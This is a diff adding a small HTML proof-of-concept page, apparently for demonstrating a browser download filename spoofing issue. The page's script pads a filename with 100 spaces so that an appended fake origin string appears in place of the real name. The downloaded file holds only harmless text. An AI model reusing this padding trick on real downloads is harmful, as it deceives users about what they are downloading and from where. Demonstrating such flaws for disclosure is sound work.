@@ -1,0 +1,25 @@
+
+<body>
+  <h1>Filename Spoofing Demo</h1>
+  <ul id="downloadList"></ul>
+
+  <script>
+    const spoofedFiles = [
+    
+      { label: "Many spaces", filename: "photo.jpg" + " ".repeat(100) + "From com.brave.browser.ipa" },
+   
+    ];
+
+    const ul = document.getElementById("downloadList");
+
+    spoofedFiles.forEach(file => {
+      const li = document.createElement("li");
+      const a = document.createElement("a");
+      a.textContent = file.label;
+      a.href = "data:text/plain,This is a spoofed file: " + file.filename;
+      a.download = file.filename;
+      li.appendChild(a);
+      ul.appendChild(li);
+    });
+  </script>
+</body>
